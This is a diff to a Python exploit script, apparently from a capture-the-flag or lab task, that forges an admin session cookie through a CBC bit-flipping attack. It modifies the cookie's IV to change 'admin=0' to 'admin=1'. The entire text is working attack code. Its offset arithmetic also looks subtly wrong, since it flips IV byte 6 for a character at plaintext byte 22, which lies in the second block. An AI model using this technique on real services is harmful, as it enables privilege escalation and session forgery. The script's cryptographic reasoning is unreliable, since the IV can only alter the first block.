@@ -34,21 +34,25 @@ def exploit(url):
 
     # Step 4: Decode the base64-encoded cookie to get IV and ciphertext
     decoded_cookie = b64decode(encrypted_cookie)
-    if len(decoded_cookie) != 48:
-        print(f"Unexpected cookie length: {len(decoded_cookie)} bytes")
-        return
-
     iv = decoded_cookie[:16]
     ct = decoded_cookie[16:]
 
+    # Debug the raw plaintext to figure out the position of 'admin=0'
+    # Assume "username=hacker&admin=0" (this can vary based on length)
+    plaintext = "username=hacker&admin=0"
+
     # Step 5: Modify the IV to change 'admin=0' to 'admin=1'
-    # The '0' is at byte index 22 in plaintext, which corresponds to byte index 6 in the IV
-    byte_to_modify = 6  # Zero-based index
-    bit_to_flip = 1    # Least significant bit
+    # The '0' is at the 22nd byte in plaintext, but we need to locate it dynamically
+    admin_index = plaintext.find('admin=0')
+    if admin_index == -1:
+        print("Could not locate 'admin=0' in the session cookie.")
+        return
 
+    byte_to_modify = admin_index + 6 - 16  # Adjust for block size and index of the IV
+    bit_to_flip = 1  # Flip the least significant bit to change '0' to '1'
+
+    # Step 6: Modify the IV and reconstruct the modified cookie
     modified_iv = flip_bit(iv, byte_to_modify, bit_to_flip)
-
-    # Step 6: Reconstruct the modified cookie
     modified_cookie_bytes = modified_iv + ct
     modified_cookie = b64encode(modified_cookie_bytes).decode()
 
